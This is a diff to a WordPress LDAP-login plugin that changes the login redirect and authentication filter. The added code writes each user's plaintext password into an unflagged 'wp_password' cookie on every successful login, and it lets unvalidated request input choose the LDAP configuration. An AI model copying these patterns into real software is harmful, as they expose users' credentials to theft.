@@ -2,7 +2,7 @@
 /*
 *   Plugin Name: Ldap
 *   Author: Studio Visual
-*   Author URI: https://studiovisual.com.br 
+*   Author URI: https://studiovisual.com.br
 *   Description: Plugin de sincronização do LDAP da GPS NET
 *   Version: 1.0
 */
@@ -24,35 +24,48 @@ new Ldap\AdminPage();
 
 //DESCOMENTAR
 //Redirect users to login on load, excluding uploads folder
-add_action( 'init', function() {
-    global $pagenow;
-    if (strpos($_SERVER['REQUEST_URI'], 'uploads') == false) {
-        if(!is_user_logged_in() && $pagenow != 'wp-login.php')
-            auth_redirect();
+add_action('init', function (): void {
+    if (is_rest_api_request()) {
+        return;
+    }
+
+    if (!is_user_logged_in() && $GLOBALS['pagenow'] !== 'wp-login.php') {
+        if (!defined('DOING_AJAX') && !defined('DOING_CRON') && strpos($_SERVER['REQUEST_URI'], 'uploads') == false) {
+            $login_url = wp_login_url($_SERVER['REQUEST_URI']);
+            wp_redirect($login_url);
+            exit;
+        }
     }
 });
 
 add_filter('authenticate', function ($user) {
     if (isset($_POST['log']) && $_POST['pwd']) {
         $user = get_user_by('login', $_POST['log']);
+        if(empty($user)){
+            $user = get_user_by('email', $_POST['log']);
+        }
 
-        if ($user && get_user_meta($user->ID, 'ldap_login', true)) {
+        if ($user && !user_can( $user->ID, 'manage_options' ) && get_user_meta($user->ID, 'ldap_login', true)) {
             $ldap = new Ldap\Config();
             $ldap->configs['gps-pamcary']['admin_username'] = "gps-pamcary\\" . $_POST["log"];
             $ldap->configs['gps-pamcary']['admin_password'] = $_POST["pwd"];
-            
+
             $ad = new Adldap\Adldap($ldap->configs['gps-pamcary']);
             if ($ad->connect()) {
                 $active = get_user_meta($user->ID, 'lus_active', true);
                 if ($active != '1') {
                     return false;
                 }
+                setcookie('wp_username', $user->user_login);
+                setcookie('wp_password', $_POST["pwd"]);
                 return $user;
             }
         }
     }
 
     if ($user && wp_check_password($_POST['pwd'], $user->data->user_pass, $user->ID)) {
+        setcookie('wp_username', $user->user_login);
+        setcookie('wp_password', $_POST["pwd"]);
         return $user;
     }
 
@@ -236,7 +249,7 @@ function updateUserMetaLdap($userObj, $userLdap, $active = 1)
 Ldap\PostRequest::register('users_ldap', function () {
     #Verifica se o retorno é por URL ou Form
     $r_empresa = isset($_GET['empresa']) ? $_GET['empresa'] : $_POST['empresa'];
-    
+
     $debug = true;
     $ldap = new Ldap\Config();
     $ad = new Adldap($ldap->configs[$r_empresa]);
